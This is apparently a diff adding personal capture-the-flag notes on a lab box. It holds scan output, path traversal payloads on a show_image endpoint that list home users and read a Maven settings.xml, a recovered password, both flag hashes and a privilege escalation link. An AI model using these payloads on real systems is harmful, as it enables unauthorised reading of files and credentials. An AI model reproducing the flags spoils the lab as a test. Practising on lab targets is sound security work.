@@ -1,0 +1,51 @@
+IP=10.10.11.204
+
+--------------
+
+Nmap Scan:
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  nagios-nsca Nagios NSCA
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+---------------
+
+Directory Scan:
+
+/register             (Status: 200) [Size: 5654]
+/blogs                (Status: 200) [Size: 5371]
+/upload               (Status: 200) [Size: 1857]
+/environment          (Status: 500) [Size: 712]
+/error                (Status: 500) [Size: 106]
+/release_notes        (Status: 200) [Size: 1086]
+/http%3A%2F%2Fwww     (Status: 400) [Size: 435]
+/show_image           (Status: 400) [Size: 194]
+/http%3A%2F%2Fyoutube (Status: 400) [Size: 435]
+
+
+There are 2 users in;
+/show_image?img=../../../../../../home/
+
+like: frank , phil
+
+
+<artifactId>spring-cloud-function-web</artifactId>
+                        <version>3.2.2</version> search this.
+
+
+
+/show_image?img=../../../../../../home/frank/.m2/settings.xml
+
+username: phil
+password: DocPhillovestoInject123
+
+
+flag:b2cd89c595ab25d7d6ffa6e97f198cff
+
+privEsc link: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/
+
+
+
+
+root flag: 997969fbead2c69d70f72da0b3864e33
